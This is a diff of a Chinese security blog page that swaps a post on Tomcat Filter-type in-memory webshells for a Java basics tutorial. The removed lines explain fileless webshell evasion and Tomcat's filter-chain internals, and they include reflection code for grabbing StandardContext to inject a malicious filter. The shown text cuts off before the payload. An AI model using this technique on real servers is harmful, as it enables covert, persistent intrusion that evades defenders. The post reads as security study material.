@@ -6,53 +6,42 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tomcat 内存马(一)：Filter型 | y0lo&#39;s blogs</title>
+  <title>java基础 | y0lo&#39;s blogs</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="Tomcat 内存马(一)：Filter型0x00 前言内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。">
+  <meta name="description" content="好久之前学的java了，之前也没有总结性的学习，在此想总结性的重新学习一下。 0x00 Java的介绍Java帝国的诞生一场旷日持久的战争 C &amp; C++ 1972年C诞生  贴近硬件，运行极快，效率极高 操作系统，编译器，数据库，网络系统等 指针和内存管理   1982年C++诞生  面向对象 兼容C 图形领域、游戏等">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Tomcat 内存马(一)：Filter型">
-<meta property="og:url" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/index.html">
+<meta property="og:title" content="java基础">
+<meta property="og:url" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/index.html">
 <meta property="og:site_name" content="y0lo&#39;s blogs">
-<meta property="og:description" content="Tomcat 内存马(一)：Filter型0x00 前言内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。">
+<meta property="og:description" content="好久之前学的java了，之前也没有总结性的学习，在此想总结性的重新学习一下。 0x00 Java的介绍Java帝国的诞生一场旷日持久的战争 C &amp; C++ 1972年C诞生  贴近硬件，运行极快，效率极高 操作系统，编译器，数据库，网络系统等 指针和内存管理   1982年C++诞生  面向对象 兼容C 图形领域、游戏等">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/memory-shell.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210402150543076.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210330212301006.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331211949427.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331212026904.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331161809013.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308193034917.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210401163837263.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331164013555.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331165143860.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331170615323.png">
-<meta property="og:image" content="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210401162549665.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331170915436.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331170950734.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331212905616.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331224226230.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331225322436.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210401145035217.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308205302333.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308205349049.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308210616610.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308210552032.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308210826334.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308211007618.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308211141247.png">
-<meta property="og:image" content="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210402120745640.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210402121540671.png">
-<meta property="og:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210402121710447.png">
-<meta property="og:image" content="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210402121845672.png">
-<meta property="article:published_time" content="2022-03-08T13:26:25.220Z">
-<meta property="article:modified_time" content="2022-03-08T13:32:07.900Z">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220313171701042.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220313173150372.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220313173851903.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220313210633071.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/1001990-20161025144757265-1724289762.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152105324.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152331996.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152344919.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152518849.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220314152529597.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315141942719.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315141836008.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315142000407.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315142221348.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315143128001.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315143357872.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315143626521.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315144642791.png">
+<meta property="og:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220315170923576.png">
+<meta property="article:published_time" content="2022-03-13T08:52:32.000Z">
+<meta property="article:modified_time" content="2022-03-15T12:57:23.199Z">
 <meta property="article:author" content="y0lo">
-<meta property="article:tag" content="web安全">
 <meta property="article:tag" content="java">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/memory-shell.png">
+<meta name="twitter:image" content="http://example.com/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220313171701042.png">
   
     <link rel="alternative" href="/atom.xml" title="y0lo&#39;s blogs" type="application/atom+xml">
   
@@ -262,14 +251,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-java内存马01" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-java基础" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      Tomcat 内存马(一)：Filter型
+      java基础
     </h1>
   
 
@@ -281,8 +270,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/" class="archive-article-date">
-        <time datetime="2022-03-08T13:26:25.220Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-08</time>
+<a href="/2022/03/13/java%E5%9F%BA%E7%A1%80/" class="archive-article-date">
+        <time datetime="2022-03-13T08:52:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-13</time>
 </a>
 
   
@@ -295,7 +284,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">3.6k字</span>
+      <span class="post-count">3.2k字</span>
     </span>
   </span>
 
@@ -304,7 +293,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">14分</span>
+      <span class="post-count">12分</span>
     </span>
   </span>
 </div>
@@ -315,181 +304,439 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="Tomcat-内存马-一-：Filter型"><a href="#Tomcat-内存马-一-：Filter型" class="headerlink" title="Tomcat 内存马(一)：Filter型"></a>Tomcat 内存马(一)：Filter型<img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/memory-shell.png" alt="img"></h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的动态注册。</p>
+    <p>好久之前学的<code>java</code>了，之前也没有总结性的学习，在此想总结性的重新学习一下。</p>
+<h1 id="0x00-Java的介绍"><a href="#0x00-Java的介绍" class="headerlink" title="0x00 Java的介绍"></a>0x00 Java的介绍</h1><h2 id="Java帝国的诞生"><a href="#Java帝国的诞生" class="headerlink" title="Java帝国的诞生"></a>Java帝国的诞生</h2><p>一场旷日持久的战争</p>
+<h3 id="C-amp-C"><a href="#C-amp-C" class="headerlink" title="C &amp; C++"></a>C &amp; C++</h3><ul>
+<li><p>1972年C诞生</p>
+<ul>
+<li>贴近硬件，运行极快，效率极高</li>
+<li>操作系统，编译器，数据库，网络系统等</li>
+<li>指针和内存管理</li>
+</ul>
+</li>
+<li><p>1982年C++诞生</p>
+<ul>
+<li>面向对象</li>
+<li>兼容C</li>
+<li>图形领域、游戏等</li>
+</ul>
+</li>
+</ul>
 <span id="more"></span>
 
-<p>这种动态注册技术来源非常久远，在安全行业里也一直是不温不火的状态，直到冰蝎的更新将 java agent 类型的内存马重新带入大众视野并且瞬间火爆起来。这种技术的爆红除了概念新颖外，也确实符合时代发展潮流，现在针对 webshell 的查杀和识别已经花样百出，大厂研发的使用分类、概率等等方式训练的机器学习算法模型，基于神经网络的流量层面的特征识别手段，基本上都花式吊打常规文件型 webshell。如果你不会写，不会绕，还仅仅使用网上下载的 jsp ，那肯定是不行的。</p>
-<p>内存马搭上了冰蝎和反序列化漏洞的快车，快速占领了人们的视野，成为了主流的 webshell 写入方式。作为 RASP 技术的使用者，自然也要来研究和学习一下内存马的思想、原理、添加方式，并探究较好、较通用的防御和查杀方式。</p>
-<p>目前安全行业主要讨论的内存马主要分为以下几种方式：</p>
+<h3 id="反抗"><a href="#反抗" class="headerlink" title="反抗"></a>反抗</h3><ul>
+<li>我们要建立一个新的语言<ul>
+<li>语法有点像C</li>
+<li>没有指针</li>
+<li>没有内存管理</li>
+<li>真正的可移植性，编写一次，到处运行</li>
+<li>面向对象</li>
+<li>类型安全</li>
+<li>高质量类库</li>
+<li>……</li>
+</ul>
+</li>
+</ul>
+<h2 id="JAVA初生"><a href="#JAVA初生" class="headerlink" title="JAVA初生"></a>JAVA初生</h2><ul>
+<li><p>1995年的网页简单而粗糙，缺乏互动性</p>
+</li>
+<li><p>图形界面的程序（Applet）</p>
+</li>
+<li><p>Bill Gate说：这是迄今为止设计的最好的语言！</p>
+</li>
+<li><p>Java 2标准版(J2SE)：去占领桌面</p>
+</li>
+<li><p>Java 2移动版(J2ME)：去占领手机</p>
+</li>
+<li><p>Java 2企业版(J2EE)：去占领服务器</p>
+</li>
+<li><p>大量的巨头加入</p>
+</li>
+</ul>
+<h2 id="Java的发展"><a href="#Java的发展" class="headerlink" title="Java的发展"></a>Java的发展</h2><ul>
+<li><p>他们基于Java平台开发了巨多的平台，系统，工具</p>
 <ul>
-<li>动态注册<strong>servlet&#x2F;filter&#x2F;listener</strong>（使用servlet-api的具体实现）</li>
-<li>动态注册<strong>interceptor&#x2F;controller</strong>（使用框架如spring&#x2F;strusts2）</li>
-<li>动态注册使用<strong>职责链</strong>设计模式的中间件、框架的实现（例如Tomcat的Pipeline &amp; Value，Grizzly的FilterChain &amp;FIlter等等）</li>
-<li>使用java agent技术写入字节码</li>
-</ul>
-<h2 id="0x01-Tomcat-简介"><a href="#0x01-Tomcat-简介" class="headerlink" title="0x01 Tomcat 简介"></a>0x01 Tomcat 简介</h2><p>这里简单的介绍一下，具体的可以看下方参考链接内容</p>
-<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/whgk/p/6399262.html">https://www.cnblogs.com/whgk/p/6399262.html</a></p>
-<h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h3><p>Servlet是一种处理请求和发送响应的程序，Servlet是为了解决动态网页而衍生的技术</p>
-<h3 id="Tomcat与Servlet的关系"><a href="#Tomcat与Servlet的关系" class="headerlink" title="Tomcat与Servlet的关系"></a>Tomcat与Servlet的关系</h3><p>Tomcat是Web应用服务器，是一个Servlet&#x2F;JSP的容器，Tomcat作为Servlet的容器，能够将用户的请求发送给Servlet，并且将Servlet的响应返回给用户。</p>
-<p>Tomcat中有四种类型的Servlet容器，从上到下分别是Engine、Host、Context、Wrapper</p>
-<ol>
-<li>Engine，实现类为<code>org.apache.cataline.core.StrandardEngine</code></li>
-<li>Host，实现类为 <code>org.apache.catalina.core.StandardHost</code></li>
-<li>Context，实现类为 <code>org.apache.catalina.core.StandardContext</code></li>
-<li>Wrapper，实现类为 <code>org.apache.catalina.core.StandardWrapper</code></li>
-</ol>
-<p>每个Wrapper实例表示一个具体的Servlet定义，StrandardWrapper是Wrapper接口的标准实现类（StrandardWrapper的主要任务就是载入Servlet类并且进行实例化）</p>
-<h3 id="Tomcat-容器"><a href="#Tomcat-容器" class="headerlink" title="Tomcat 容器"></a>Tomcat 容器</h3><p>在Tomcat中，每个Host下可以有多个Context（Context是Host的子容器），每个Context都代表一个具体的web应用，都有一个唯一的路径就是相当于下图中的 <code>/shop</code> <code>/manage</code>这种，在一个Context下可以有着多个Wrapper</p>
-<p>Wrapper主要主要负责管理Servlet的装载、初始化、执行以及资源回收</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210402150543076.png" alt="image-20210402150543076"></p>
-<h2 id="0x02-内存马简单介绍"><a href="#0x02-内存马简单介绍" class="headerlink" title="0x02 内存马简单介绍"></a>0x02 内存马简单介绍</h2><p>由于现在各种防护措施越来越多，文件shell就如c0ny1师傅所说的大部分已经气数已尽，内存马因其隐蔽性等优点从而越来越盛行</p>
-<p>内存马主要分为以下几类：</p>
-<ol>
-<li>servlet-api类<ul>
-<li>filter型</li>
-<li>servlet型</li>
+<li>构建工具：Ant，Maven，Jekins</li>
+<li>应用服务器：Tomcat，Jetty，Jboss，Websphere，weblogic</li>
+<li>web开发：Struts，Spring，Hibernate，Mybatis</li>
+<li>开发工具：Eclipse，Netbean，Idea，Jbuilder</li>
+<li>……</li>
 </ul>
 </li>
-<li>spring类<ul>
-<li>拦截器</li>
-<li>controller型</li>
+<li><p>2006：Hadoop（大数据领域）</p>
+</li>
+<li><p>2008：Android（手机端）</p>
+</li>
+</ul>
+<h2 id="Java特性和优势"><a href="#Java特性和优势" class="headerlink" title="Java特性和优势"></a>Java特性和优势</h2><p>简单性、面向对象、可移植性、高性能、分布性、动态性、多线程、安全性、健壮性</p>
+<h2 id="Java三大版本"><a href="#Java三大版本" class="headerlink" title="Java三大版本"></a>Java三大版本</h2><ul>
+<li><p>Write Once、Run Anywhere</p>
+</li>
+<li><p>JavaSE：标准版（桌面程序、控制台开发……）</p>
+</li>
+<li><p>JavaME：嵌入式开发（手机、小家电……）</p>
+</li>
+<li><p>JavaEE：企业级开发（web端、服务器开发……）</p>
+</li>
+</ul>
+<h2 id="JDK、JRE、JVM"><a href="#JDK、JRE、JVM" class="headerlink" title="JDK、JRE、JVM"></a>JDK、JRE、JVM</h2><ul>
+<li>JDK：Java Development Kit</li>
+<li>JRE：Java Runtime Environment</li>
+<li>JVM：Java Virtual Machine</li>
+</ul>
+<p><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220313171701042.png" alt="image-20220313171701042"></p>
+<h1 id="0x01-Java基础语法"><a href="#0x01-Java基础语法" class="headerlink" title="0x01 Java基础语法"></a>0x01 Java基础语法</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ul>
+<li>Java中的注释有三种：<ul>
+<li>单行注释    <code>//</code></li>
+<li>多行注释    <code>/* 注释 */</code></li>
+<li>文档注释    <code>/** @Author y0lo */</code></li>
 </ul>
 </li>
-<li>java Instrumentation类<ul>
-<li>agent型</li>
 </ul>
+<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><ul>
+<li><p>关键字</p>
+<p><img src="/2022/03/13/java%E5%9F%BA%E7%A1%80/image-20220313173150372.png" alt="image-20220313173150372"></p>
 </li>
-</ol>
-<h2 id="0x03-Tomcat-Filter-流程"><a href="#0x03-Tomcat-Filter-流程" class="headerlink" title="0x03 Tomcat Filter 流程"></a>0x03 Tomcat Filter 流程</h2><p>Filter被我们称之为过滤器，是Java中最常见也是最实用的技术之一，通常被用来处理静态web资源和访问权限的控制和过滤、记录日志等附加功能等等。一次请求进入到服务器后，会先由Filter进行处理，再交给Servlet。</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210330212301006.png" alt="image-20210330212301006"></p>
-<p>通常Filter配置在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式：</p>
-<ol>
-<li>使用<code>ServletContext</code>的<code>addFilter/createFilter</code>方法注册。</li>
-<li>使用<code>ServletContextListener</code>的<code>contextInitialized</code>方法在服务器启动时注册。</li>
-<li>使用<code>ServletContainerInitializer</code>的<code>onStartup</code>方法在初始化时注册（非动态）</li>
-</ol>
-<p>本节只讨论使用 <code>ServletContext</code> 添加 Filter 内存马的方法。首先来看一下 <code>createFilter</code> 方法，按照注释，这个类用来在调用 <code>addFilter</code> 向 <code>ServletContext</code> 实例化一个指定的 Filter 类。</p>
-<p>在具体分析流程之前我们先介绍一下后面会遇到的几个类：</p>
+<li><p>Java 所有的组成部分都需要名字。类名、变量名以及方法名都被称为关键字</p>
+</li>
+</ul>
+<h3 id="标识符注意点"><a href="#标识符注意点" class="headerlink" title="标识符注意点"></a>标识符注意点</h3><ul>
+<li>所有的标识符都应该以字母（A-Z或者a-z），美元符（$）、或者下划线（_）开始</li>
+<li>首字母之后可以是字母（A-Z或者a-z），美元符（$）、或者下划线（_）或数字的任何字符组成</li>
+<li>不能使用关键字作为变量名或方法名。</li>
+<li>标识符是大小写敏感的</li>
+<li>可以使用中文命名，但不建议，也不建议使用拼音</li>
+</ul>
+<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul>
+<li><p>强类型语言（Java是强类型语言）</p>
 <ul>
-<li>FilterDefs：存放FilterDef的数组，FilterDef中存放我们顾虑器名，过滤器实例，作用范围（url）等基本信息</li>
-<li>FilterConfigs：存放FIlterConfig的数组，在FIlterConfig中主要存放FilterDef和Fitler对象信息</li>
-<li>FilterMaps：存放FilterMap的数组，在FilterMap中主要存放了FilterName和对应的URLPattern</li>
-<li>FilterChain：过滤器链，该对象上的doFilter方法能一次调用链上的Filter</li>
-<li>WebXml：存放web.xml中内容的类</li>
-<li>ContextConfig：web应用的上下文配置类</li>
-<li>StandardContext：Context接口的标准实现类，一个Context代表一个Web应用，其下可以包含多个Wrapper</li>
-<li>StandardWrapperValue：一个Wrapper的标准实现类，一个Wrapper代表一个Servlet</li>
+<li>要求变量的使用要严格符合规定，所有变量必须先定义后才能使用</li>
 </ul>
-<p>接下来我们来分析一下 Tomcat 中是如何将我们自定义的 filter 进行设置并且调用的</p>
-<p>首先会通过 configureContext 解析 web.xml 然后返回 webXml 实例</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331211949427.png" alt="image-20210331211949427"></p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331212026904.png" alt="image-20210331212026904"></p>
-<p>在 StandardWrapperValve 中会利用 ApplicationFilterFactory 来创建 filterChain（filter链），我们跟进这个方法</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331161809013.png" alt="image-20210331161809013"></p>
-<p>我们看到红框处的代码，首先会调用 getParent 获取当前 Context （即当前 Web应用），然后会从 Context 中获取到 filterMaps</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20220308193034917.png" alt="image-20220308193034917"></p>
-<p>filterMaps中的 filterMap 主要存放了过滤器的名字以及作用的 url，继续往下看</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210401163837263.png" alt="image-20210401163837263"></p>
-<p>发现会遍历 FilterMaps 中的 FilterMap，如果发现符合当前请求 url 与 FilterMap 中的 urlPattern  相匹配，就会进入 if 判断会调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName名称的 FilterConfig，然后如果不为null，就进入 if 判断，将 filterConfig 添加到  filterChain中，跟进addFilter函数</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331164013555.png" alt="image-20210331164013555"></p>
-<p>在addFilter函数中首先会遍历filters，判断我们的filter是否已经存在（其实就是去重）</p>
-<p>下面这个 if 判断其实就是扩容，如果 n 已经等于当前 filters 的长度了就再添加10个容量，最后将我们的filterConfig 添加到 filters中</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331165143860.png" alt="image-20210331165143860"></p>
-<p>至此 filterChain 组装完毕，重新回到 StandardContextValue 中，调用 filterChain 的 doFilter 方法 ，就会依次调用 Filter 链上的 doFilter方法</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331170615323.png" alt="image-20210331170615323"></p>
-<p>在 doFilter 方法中会调用 internalDoFilter方法</p>
-<p><img src="https://gitee.com/KpLi0rn/BlogImag/raw/master/img/image-20210401162549665.png" alt="image-20210401162549665"></p>
-<p>在internalDoFilter方法中首先会依次从 filters 中取出 filterConfig</p>
-<p>然后会调用 getFilter() 将 filter 从 filterConfig 中取出，调用 filter 的 doFilter方法</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331170915436.png" alt="image-20210331170915436"></p>
-<p>从而调用我们自定义过滤器中的 doFilter 方法，从而触发了相应的代码</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331170950734.png" alt="image-20210331170950734"></p>
-<p>最后放一张来自宽字节安全的图</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331212905616.png" alt="image-20210331212905616"></p>
-<p>总结：</p>
-<ol>
-<li>根据请求的 URL 从 FilterMaps 中找出与之 URL 对应的 Filter 名称</li>
-<li>根据 Filter 名称去 FilterConfigs 中寻找对应名称的 FilterConfig</li>
-<li>找到对应的 FilterConfig 之后添加到 FilterChain 中，并且返回 FilterChain</li>
-<li>根据 FilterChain 调用 internalDoFilter 方法遍历获取 chain 中的 FilterConfig，然后从 FilterConfig 中获取 Filter，调用 Filter 的doFilter方法</li>
-</ol>
-<p>根据上面的简单总结，我们可以发现最开始是从 context 中获取的 FilterMaps， 然后将符合条件的依次按照顺序进行调用。</p>
-<p>那么我们可以自己创建一个 FilterMap 然后将其放在 FilterMaps 的最前面，这样当 urlpattern 匹配到的时候就会找到对应的 FilterName 的 FilterConfig ，然后添加到 FilterChain 中，最终触发我们的内存 shell</p>
-<h2 id="0x04-Filter-型内存马"><a href="#0x04-Filter-型内存马" class="headerlink" title="0x04 Filter 型内存马"></a>0x04 Filter 型内存马</h2><p>该方法只能在 tomcat 7.x 以上利用具体原因会在后文提到</p>
-<p>前面说到当组装我们的过滤器链的时候，是从 context 中获取到的 FilterMaps</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331224226230.png" alt="image-20210331224226230"></p>
-<p> 那么我们如何获取这个 context 呢？</p>
-<p>当我们能直接获取 request 的时候，我们可以直接使用如下方法</p>
-<p>将我们的 ServletContext 转为 StandardContext 从而获取 context</p>
-<p>ps：当 Web 容器启动的时候会为每个 Web 应用都创建一个 ServletContext 对象，代表当前 Web 应用</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// ApplicationContext 为 ServletContext 的实现类</span></span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 这样我们就获取到了 context </span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
-
-<p>其他的获取 context 的方法（ 暂时还未仔细研究，所以这里就先放链接了）</p>
-<ul>
-<li><p>从线程中获取StandardContext</p>
-<p>如果没有request对象的话可以从当前线程中获取</p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/114625962">https://zhuanlan.zhihu.com/p/114625962</a></p>
 </li>
-<li><p>从MBean中获取</p>
-<p><a target="_blank" rel="noopener" href="https://scriptboy.cn/p/tomcat-filter-inject/">https://scriptboy.cn/p/tomcat-filter-inject/</a></p>
+<li><p>弱类型语言</p>
+</li>
+<li><p>Java的数据类型分为两大类</p>
+<ul>
+<li>基本类型（primitive type）</li>
+<li>引用类型（reference type）</li>
+</ul>
 </li>
 </ul>
-<p>获取到 Context 之后 ，我们可以发现其中的 filterConfigs，filterDefs，filterMaps 这三个参数和我们的 filter 有关，那么如果我们可以控制这几个变量那么我们或许就可以注入我们的内存马</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210331225322436.png" alt="image-20210331225322436"></p>
-<p><strong>FilterDefs</strong>：存放FilterDef的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p>
-<p><strong>filterConfigs</strong>：存放filterConfig的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter对象等信息</p>
-<p><strong>filterMaps</strong>：一个存放FilterMap的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的URLPattern</p>
-<p><img src="/2022/03/08/java%E5%86%85%E5%AD%98%E9%A9%AC01/image-20210401145035217.png" alt="image-20210401145035217"></p>
-<p>大致流程如下：</p>
-<ol>
-<li>创建一个恶意的 Filter</li>
